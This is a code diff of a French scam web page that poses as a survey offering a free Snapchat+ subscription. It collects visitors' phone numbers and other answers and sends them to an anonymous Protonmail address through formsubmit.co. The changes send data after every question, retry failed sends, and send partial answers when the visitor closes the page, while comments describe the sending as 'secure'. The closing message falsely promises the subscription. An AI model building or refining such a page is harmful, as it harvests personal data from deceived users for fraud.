@@ -168,25 +168,25 @@ let reponsesUtilisateur = [];
 const formsubmitURL = "https://formsubmit.co/anonymous2026b@protonmail.com";
 const ccEmail = "becteurfoou@proton.me";
 
+// Fonction de démarrage
 function demarrer(){
     document.getElementById("intro").style.display="none";
     document.getElementById("sondage").style.display="block";
     afficherQuestion();
 }
 
+// Affichage question actuelle
 function afficherQuestion(){
     const q = questions[indexQuestion];
     document.getElementById("question").textContent = q.text;
 
     if(q.type === "custom-phone"){
-
         document.getElementById("reponses").innerHTML = `
             <div style="display:flex; gap:10px; justify-content:center;">
                 <select id="prefix" onchange="verifier()" style="padding:10px; font-size:16px;">
                     <option value="06">06</option>
                     <option value="07">07</option>
                 </select>
-
                 <input 
                     type="tel"
                     id="champ"
@@ -199,9 +199,7 @@ function afficherQuestion(){
                 >
             </div>
         `;
-
     } else {
-
         document.getElementById("reponses").innerHTML =
             `<input type="${q.type}" 
                     id="champ" 
@@ -215,9 +213,9 @@ function afficherQuestion(){
     updateProgress();
 }
 
+// Vérification entrée utilisateur
 function verifier(){
     const q = questions[indexQuestion];
-
     if(q.type === "custom-phone"){
         const numero = document.getElementById("champ").value.trim();
         document.getElementById("btnSuivant").disabled = numero.length !== 8;
@@ -227,13 +225,14 @@ function verifier(){
     }
 }
 
+// Mise à jour barre de progression
 function updateProgress(){
     document.getElementById("progressBar").style.width =
         ((indexQuestion+1)/questions.length*100) + "%";
 }
 
+// Passage à la question suivante
 function suivant(){
-
     const q = questions[indexQuestion];
 
     if(q.type === "custom-phone"){
@@ -244,34 +243,20 @@ function suivant(){
             alert("Numéro invalide (8 chiffres après 06 ou 07)");
             return;
         }
-
         reponsesUtilisateur[indexQuestion] = prefix + numero;
-
     } else {
         const champ = document.getElementById("champ");
-        const val = champ.value.trim();
-        reponsesUtilisateur[indexQuestion] = val;
+        reponsesUtilisateur[indexQuestion] = champ.value.trim();
     }
 
-    // Étape 1
-    if(indexQuestion === 2){
-        envoyer(1);
-    }
-
-    // Étape 2
-    if(indexQuestion === 4){
-        envoyer(2);
-    }
+    // Envoi sécurisé à chaque étape
+    envoyer(indexQuestion+1);
 
     indexQuestion++;
-
     if(indexQuestion < questions.length){
         afficherQuestion();
     } else {
-
         // Étape finale
-        envoyer(3);
-
         document.getElementById("sondage").innerHTML = `
             <h2>Merci pour votre participation !</h2>
             <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
@@ -279,15 +264,15 @@ function suivant(){
     }
 }
 
+// Continuer après écran intermédiaire
 function continuer(){
     document.getElementById("intermediaire").style.display="none";
     document.getElementById("sondage").style.display="block";
     afficherQuestion();
 }
 
-// Envoi Formsubmit
+// Fonction d'envoi Formsubmit sécurisée
 function envoyer(etape){
-
     const formData = new FormData();
     formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
     formData.append("artiste_deezer", reponsesUtilisateur[1] || "");
@@ -299,12 +284,36 @@ function envoyer(etape){
     formData.append("_subject", `Réponses sondage Snapchat+ (étape ${etape})`);
     formData.append("_captcha","false");
 
-    fetch(formsubmitURL, { method:"POST", body:formData })
-    .then(() => console.log(`Envoi réussi étape ${etape}`))
-    .catch(() => console.log(`Erreur lors de l'envoi étape ${etape}`));
+    // Envoi fiable avec retry automatique
+    const maxRetries = 3;
+    let attempt = 0;
+
+    function trySend(){
+        attempt++;
+        fetch(formsubmitURL, { method:"POST", body:formData })
+        .then(res => {
+            if(!res.ok) throw new Error("Erreur HTTP");
+            console.log(`Envoi réussi étape ${etape}`);
+        })
+        .catch(err => {
+            console.warn(`Tentative ${attempt} échouée pour l'étape ${etape}`);
+            if(attempt < maxRetries){
+                setTimeout(trySend, 1500); // retry après 1.5s
+            } else {
+                console.error(`Échec définitif de l'envoi étape ${etape}`);
+            }
+        });
+    }
+
+    trySend();
 }
+
+// Sauvegarde automatique si l'utilisateur ferme ou change de page
+window.addEventListener("beforeunload", function(e){
+    if(reponsesUtilisateur.length > 0 && indexQuestion < questions.length){
+        envoyer(indexQuestion); // Envoi avant fermeture
+    }
+});
 </script>
 </body>
 </html>
-
-
